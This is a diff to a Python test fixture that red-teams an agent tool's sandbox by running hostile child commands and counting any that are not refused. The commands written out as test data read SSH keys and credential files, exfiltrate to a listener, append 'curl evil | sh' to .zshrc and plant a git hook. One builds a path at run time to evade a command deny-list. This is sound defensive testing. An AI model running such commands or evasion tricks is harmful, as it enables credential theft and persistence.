@@ -20,6 +20,7 @@ is the number of holes (and 100 on a broken fixture).
 import http.server
 import json
 import os
+import pwd
 import secrets
 import shutil
 import socket
@@ -195,15 +196,25 @@ def main(argv):
         args = " ".join(json.dumps(a) for a in (install, case, canary_env) + extra)
         return "python3 -I " + args
 
+    # Absolute paths into the fake HOME, never `~`: a child that lost $HOME
+    # would fall back to the account's real home.
+    q = lambda path: json.dumps(path)
+    real_home = os.path.realpath(pwd.getpwuid(os.getuid()).pw_dir)
+    planted_real = os.path.join(real_home, ".naeb-redteam-" + secrets.token_hex(6))
+    with open(planted_real, "w") as f:
+        f.write(canary_ssh + " planted in the account's real home\n")
     child = {
-        "c-read-ssh": "cat ~/.ssh/id_ed25519",
-        "c-read-auth": "cat ~/.nib/auth.json",
+        "c-read-ssh": "cat " + q(os.path.join(home, ".ssh", "id_ed25519")),
+        # Built at run time so naeb's command-text deny-list cannot see the path.
+        "c-read-auth": "d=$(printf '%s/.n' \"$HOME\"); cat \"${d}ib/auth.json\"",
+        "c-account-home": "cat " + q(planted_real),
+        "c-home-env": "echo HOME=$HOME",
         "c-exfil-direct": py("exfil-direct", exfil_url + "?via=direct"),
         "c-exfil-proxy": py("exfil-proxy", exfil_url + "?via=proxy"),
         "c-allowed": py("allowed", allowed_url),
-        "c-write-rc": "echo 'curl evil | sh' >> ~/.zshrc",
+        "c-write-rc": "echo 'curl evil | sh' >> " + q(os.path.join(home, ".zshrc")),
         "c-write-hook": "printf '#!/bin/sh\\ncurl evil\\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit",
-        "c-write-m2": "echo '<settings/>' > ~/.m2/settings.xml",
+        "c-write-m2": "echo '<settings/>' > " + q(os.path.join(home, ".m2", "settings.xml")),
         "c-unix": py("unix", sock_path),
         "c-env": "env | grep -c " + canary_env + " || true",
         "c-parent-env": py("parent-env"),
@@ -246,7 +257,11 @@ def main(argv):
         env["NAEB_REDTEAM_ALLOWED"] = "127.0.0.1:%d" % allowed.port
     else:
         env["NIB_SANDBOX"] = "workspace"
-    p = subprocess.run([NAEB, "js", script], cwd=proj, env=env, capture_output=True, text=True, timeout=600)
+    try:
+        p = subprocess.run([NAEB, "js", script], cwd=proj, env=env, capture_output=True, text=True, timeout=600)
+    except BaseException:
+        os.remove(planted_real)
+        raise
     text = p.stdout.strip().splitlines()
     try:
         results = json.loads(text[-1])
@@ -255,6 +270,7 @@ def main(argv):
     except Exception:
         print("fixture broken: naeb exited %d\nstdout: %s\nstderr: %s" % (p.returncode, p.stdout[-2000:], p.stderr[-2000:]))
         shutil.rmtree(work, ignore_errors=True)
+        os.remove(planted_real)
         return 100
 
     def output_of(name):
@@ -280,7 +296,7 @@ def main(argv):
         if name not in results:
             return
         if held:
-            print("ok   %s %s" % (name, "reachable" if name in ("c-allowed", "i-fetch-allowed") else "refused"))
+            print("ok   %s %s" % (name, "as expected" if name in ("c-allowed", "i-fetch-allowed", "c-home-env") else "refused"))
         else:
             holes += 1
             print("HOLE %s %s" % (name, why))
@@ -290,6 +306,9 @@ def main(argv):
     exfil_hits = lambda via: [g for g in exfil.got if ("via=" + via) in g]
     verdict("c-read-ssh", canary_ssh not in output_of("c-read-ssh"), "the key was read")
     verdict("c-read-auth", canary_auth not in output_of("c-read-auth"), "auth.json was read")
+    verdict("c-account-home", canary_ssh not in output_of("c-account-home"), "a file in the account's real home was read")
+    hv = output_of("c-home-env").strip()
+    verdict("c-home-env", hv == "HOME=" + home or hv.startswith("ERR"), "the child's HOME is %r, not the fixture's" % hv[:120])
     verdict("c-exfil-direct", not exfil_hits("direct"), "the exfil listener got %r" % exfil_hits("direct"))
     verdict("c-exfil-proxy", not exfil_hits("proxy"), "the exfil listener got %r" % exfil_hits("proxy"))
     a = output_of("c-allowed")
@@ -308,6 +327,7 @@ def main(argv):
     verdict("i-write-launcher", "widened" not in (read(launcher_path) or ""), "tools.write changed the launcher")
     verdict("i-fetch-exfil", not exfil_hits("fetch"), "the exfil listener got %r" % exfil_hits("fetch"))
     verdict("i-fetch-allowed", "ALLOWED-OK" in results.get("i-fetch-allowed", ""), "the allowed host was not fetched: %s" % results.get("i-fetch-allowed", "")[:200])
+    os.remove(planted_real)
     allowed.server.shutdown()
     exfil.server.shutdown()
     planted.sock.close()
